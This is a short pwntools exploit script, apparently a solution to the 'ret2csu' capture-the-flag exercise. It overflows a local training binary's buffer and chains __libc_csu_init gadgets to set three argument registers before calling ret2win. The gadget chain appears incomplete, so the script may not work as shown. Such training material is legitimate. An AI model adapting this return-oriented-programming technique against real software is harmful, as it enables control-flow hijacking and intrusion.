from pwn import *
import io
elf = ELF("./ret2csu")
p = process("./ret2csu")


pop_rdi = p64(0x00000000004006a3)
pop_rsi_r15 = p64(0x00000000004006a1)
ret2win = p64(0x400510)
mov_rdx_r15_mov_rsi_r14_mov_edi_r13_d_call = p64(0x00400680)
pop_r15 = p64(0x00000000004006a2)

payload = b''

payload += pop_r15 + p64(0xd00df00dd00df00d)
payload += mov_rdx_r15_mov_rsi_r14_mov_edi_r13_d_call
payload += pop_rdi + p64(0xdeadbeefdeadbeef)
payload += pop_rsi_r15 + p64(0xcafebabecafebabe) + p64(0)
payload += ret2win


p.recvuntil('> ') 
p.send(cyclic(40) + payload)
p.interactive()
